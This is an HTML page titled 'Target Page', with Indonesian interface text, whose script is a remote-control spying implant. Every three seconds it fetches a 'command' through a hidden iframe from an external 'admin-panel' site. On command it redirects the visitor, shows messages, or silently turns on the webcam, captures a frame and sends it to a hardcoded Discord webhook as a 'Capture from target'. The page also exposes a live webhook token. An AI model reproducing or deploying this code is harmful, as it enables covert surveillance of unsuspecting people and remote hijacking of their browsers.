<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Target Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: white;
            transition: background 0.5s;
        }
        #chat {
            margin-top: 20px;
            padding: 10px;
            background: #f1f1f1;
            display: none;
            border-radius: 10px;
        }
    </style>
</head>
<body>
    <h1>Target Page</h1>
    <p id="message">Menunggu perintah...</p>
    <div id="chat" style="display: none;"></div>
    <video id="video" autoplay style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        async function checkCommand() {
            try {
                let frame = document.createElement("iframe");
                frame.style.display = "none";
                frame.src = "https://hazelnuttty.github.io/admin-panel/"; // Sesuaikan dengan URL admin

                document.body.appendChild(frame);

                frame.onload = function () {
                    let command = frame.contentWindow.localStorage.getItem("command");
                    document.getElementById("message").innerText = "Pesan: " + command;

                    if (command.startsWith("redirect:")) {
                        window.location.href = command.replace("redirect:", "").trim();
                    } else if (command.startsWith("bgcolor:")) {
                        document.body.style.backgroundColor = command.replace("bgcolor:", "").trim();
                    } else if (command.startsWith("pesan:")) {
                        let pesan = command.replace("pesan:", "").trim();
                        let chatBox = document.getElementById("chat");
                        chatBox.style.display = "block";
                        chatBox.innerText = pesan;
                    } else if (command.trim() === "capture") {
                        captureAndSend();
                    }

                    document.body.removeChild(frame);
                };
            } catch (error) {
                console.error("Gagal mengambil perintah", error);
            }
        }
        setInterval(checkCommand, 3000);

        async function captureAndSend() {
            let video = document.getElementById("video");
            let canvas = document.getElementById("canvas");
            let ctx = canvas.getContext("2d");

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    setTimeout(() => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        ctx.drawImage(video, 0, 0);
                        stream.getTracks().forEach(track => track.stop());
                        sendToDiscord(canvas.toDataURL("image/png"));
                    }, 2000);
                })
                .catch(err => console.error("Gagal mengakses kamera", err));
        }

        async function sendToDiscord(imageData) {
            let webhookURL = "https://discord.com/api/webhooks/1353718170984386631/XHoEF7XoKIiE-j_jUTUfa2ej82RT1jN_dBxsJRrwfVxtOtJmf_vnlEoi9KpBbGbM8h7_";
            let payload = { content: "ðŸ“¸ Capture from target", files: [{ attachment: imageData, name: "capture.png" }] };

            fetch(webhookURL, {
                method: "POST",
                body: JSON.stringify(payload),
            }).catch(err => console.error("Gagal mengirim gambar", err));
        }
    </script>
</body>
</html>
